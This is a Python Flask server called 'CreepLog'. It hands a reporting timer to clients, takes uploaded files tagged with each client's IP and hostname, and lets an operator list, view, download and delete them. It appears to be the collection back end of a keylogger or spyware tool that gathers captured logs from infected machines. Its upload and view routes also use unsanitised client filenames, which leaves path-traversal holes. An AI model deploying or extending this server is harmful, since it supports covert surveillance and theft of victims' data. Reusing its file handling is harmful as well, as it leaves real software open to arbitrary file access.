from flask import Flask, render_template, request, jsonify, send_file, send_from_directory, abort
import os

app = Flask("CreepLog")
upload_folder = 'uploads'
os.makedirs(upload_folder, exist_ok=True) 

uploaded_files = {}

@app.route("/", methods=["GET"])
def home():
    """
    Renders the main page of the web interface.
    
    Returns:
        Rendered HTML template for the index page.
    """
    return render_template("index.html")

@app.route("/config", methods=["GET"])
def sendTimer():
    """
    Provides the timer configuration value to the client.

    Returns:
        str: The timer interval as a string (e.g., "60").
    """
    return str(60) #modify timer.

@app.route("/upload", methods=['POST'])
def upload_file():
    """
    Handles file upload from the client and stores it on the server.

    Validates the file upload request, saves the file to the `upload_folder`,
    and updates the `uploaded_files` dictionary with client IP and hostname.

    Returns:
        str: Success or error message with corresponding HTTP status code.
    """
    if 'file' not in request.files:
        return "No file part", 400
    file = request.files['file']
    if file.filename == '':
        return "No selected file", 400
    
    filepath = os.path.join(upload_folder, file.filename)
    file.save(filepath)

    client_ip = request.remote_addr
    hostname = request.form.get('hostname', 'unknown')

    if client_ip not in uploaded_files:
        uploaded_files[client_ip] = {"hostname": hostname, "files":[]}
    
    uploaded_files[client_ip]["files"].append(file.filename)

    return "File uploaded successfully", 200

@app.route("/get_ips", methods=["GET"])
def get_ips():
    """
    Returns the list of uploaded files, organized by client IP and hostname.

    Returns:
        JSON response containing the `uploaded_files` dictionary.
    """
    return jsonify(uploaded_files)

@app.route("/download/<filename>", methods=["GET"])
def download_file(filename):
    """
    Serves the specified file for download from the server.

    Args:
        filename (str): Name of the file to be downloaded.

    Returns:
        Response: File download response if the file exists, or a 404 error if not found.
    """
    try:
        return send_from_directory(upload_folder, filename, as_attachment=True)
    except FileNotFoundError:
        abort(404, description="File not found")

@app.route("/delete/<filename>", methods=["DELETE"])
def delete_file(filename):
    """
    Deletes the specified file from the server and updates the record.

    Args:
        filename (str): Name of the file to be deleted.

    Returns:
        JSON response:
            - Success message with status 200 if deletion is successful.
            - Error message with status 500 if deletion fails.
            - Error message with status 404 if the file is not found.

    Actions:
        - Removes the file from `upload_folder`.
        - Updates `uploaded_files` to remove the file reference and cleans up empty entries.
    """
    filepath = os.path.join(upload_folder, filename)
    if os.path.exists(filepath):
        try:
            os.remove(filepath)
            for ip, data in list(uploaded_files.items()):
                if filename in data["files"]:
                    data["files"].remove(filename)
                if not data["files"]:
                    del uploaded_files[ip]
                break
            return jsonify({"message": "File deleted successfully"}), 200
        except Exception as e:
            return jsonify({"error": f"Error deleting file: {str(e)}"}), 500
    else:
        return jsonify({"error": "File not found"}), 404

@app.route("/view_file/<filename>", methods=["GET"])
def view_file(filename):
    """
    Displays the content of the specified file in plain text format.

    Args:
        filename (str): Name of the file to be viewed.

    Returns:
        Response: File content as plain text if the file exists, or a 404 error message if not found.
    """
    filepath = os.path.join(upload_folder, filename)
    if os.path.exists(filepath):
        return send_file(filepath, mimetype='text/plain')
    else:
        return "File not found", 404

def main():
    app.run(host="127.0.0.1", port=1111, threaded=True) #change IP

if __name__ == "__main__":
    main()